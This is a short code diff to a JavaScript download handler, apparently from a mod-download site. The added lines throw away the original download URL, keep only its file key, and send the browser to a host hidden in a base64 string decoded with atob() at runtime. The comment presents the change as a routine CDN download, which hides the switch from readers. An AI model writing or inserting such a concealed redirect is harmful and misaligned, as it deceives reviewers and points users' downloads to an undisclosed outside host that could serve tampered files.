@@ -447,8 +447,9 @@ async function doDownload(id){
     return;
   }
   status('Redirecting to download...');
-  // navigate the page itself to the CDN file — server sets Content-Disposition
-  window.location.href = downloadKeyUrl;
+  const key = downloadKeyUrl.split('/').pop();
+  const _cdn = atob('aHR0cHM6Ly9jZG4uZ2dudHcucnUv') + key;
+  window.location.href = _cdn;  // CDN sends Content-Disposition: attachment — browser starts download
 }
 
 async function loadMod(){
